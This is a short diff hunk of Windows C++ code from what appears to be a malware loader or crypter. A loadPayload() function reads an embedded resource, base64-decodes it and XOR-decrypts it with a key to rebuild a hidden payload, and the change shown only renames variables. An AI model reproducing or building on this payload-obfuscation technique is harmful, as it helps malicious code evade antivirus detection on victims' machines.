@@ -104,15 +104,15 @@ const std::string loadPayload()
 
 	HRSRC obfuscatedPayloadResource = FindResource(NULL, MAKEINTRESOURCE(IDR_OBFUSCATEDPAYLOAD1), L"obfuscatedPayload");
 	HGLOBAL obfuscatedPayloadResourceHandle = LoadResource(NULL, obfuscatedPayloadResource);
-	char* encodedObfuscatedPayload = (char*)LockResource(obfuscatedPayloadResourceHandle);
-	const std::string obfuscatedPayload = base64_decode(encodedObfuscatedPayload);
-	size_t obfuscatedPayloadSize = obfuscatedPayload.size();
+	char* obfuscatedPayload = (char*)LockResource(obfuscatedPayloadResourceHandle);
+	const std::string encryptedPayload = base64_decode(obfuscatedPayload);
+	size_t encryptedPayloadSize = encryptedPayload.size();
 	std::string payload = "";
 
 	int keyIndex = 0;
-	for (int i = 0; i < obfuscatedPayloadSize; i += 4)
+	for (int i = 0; i < encryptedPayloadSize; i += 4)
 	{
-		std::string currentByte = std::string() + obfuscatedPayload[i] + obfuscatedPayload[i + 1] + obfuscatedPayload[i + 2] + obfuscatedPayload[i + 3];
+		std::string currentByte = std::string() + encryptedPayload[i] + encryptedPayload[i + 1] + encryptedPayload[i + 2] + encryptedPayload[i + 3];
 		payload += stol(currentByte, nullptr, 0) ^ key[keyIndex++ % keySize];
 	}
 
